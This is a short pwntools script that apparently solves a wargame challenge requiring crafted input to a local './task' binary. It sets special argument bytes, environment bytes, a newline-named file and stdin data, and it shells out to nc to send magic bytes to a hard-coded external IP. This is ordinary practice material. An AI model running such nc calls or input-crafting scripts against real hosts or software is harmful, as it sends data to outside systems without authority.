from pwn import *
import sys
import os
pr="./task"
lst=list()
for i in range(99):
	lst.append("A")


lst[64]="\x00"
lst[65]="\x20\x0a\x0d"
lst[66]="1234"
arg=list()
menv=dict()
arg.append(pr)
for j in lst:
	arg.append(j)
menv["\xde\xad\xbe\xef"]="\xca\xfe\xba\xbe"
open("\x0a","w").write("\x00\x00\x00\x00")

p=process(arg,stderr=open("./err","r"),env=menv)
p.sendline("\x00\x0a\x00\xff")
os.system('echo -e "\xde\xad\xbe\xef"|nc 40.89.172.98 1234')
p.interactive()













